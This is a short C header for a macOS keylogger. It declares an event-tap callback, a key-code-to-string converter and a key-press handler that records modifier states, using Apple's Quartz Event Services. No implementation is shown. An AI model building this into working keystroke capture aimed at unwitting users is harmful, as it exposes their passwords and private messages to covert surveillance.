#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <stdbool.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
// https://developer.apple.com/documentation/coregraphics/quartz_event_services

int start();
CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
char* createStringForKey(CGKeyCode keyCode, UInt32 modifiersKeyState);
extern void handleKeyPress(
    char* printableRepresentation,
    int keyCode,
    bool caps,
    bool shift,
    bool option,
    bool cmd,
    bool control);

#endif
